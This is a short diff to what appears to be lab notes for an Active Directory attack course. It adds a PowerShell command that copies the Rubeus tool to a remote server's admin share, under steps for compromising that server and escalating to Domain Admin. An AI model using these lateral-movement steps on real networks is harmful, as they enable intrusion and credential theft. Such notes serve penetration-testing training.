@@ -627,3 +627,6 @@ Find-PSRemotingLocalAdminAccess
 
 *Compromise the server and escalate to Domain Admin privileges*
 Use rubeus on the server to run on listener mode
+```powershell
+echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\C$\Users\Public\Rubeus.exe /Y
+```
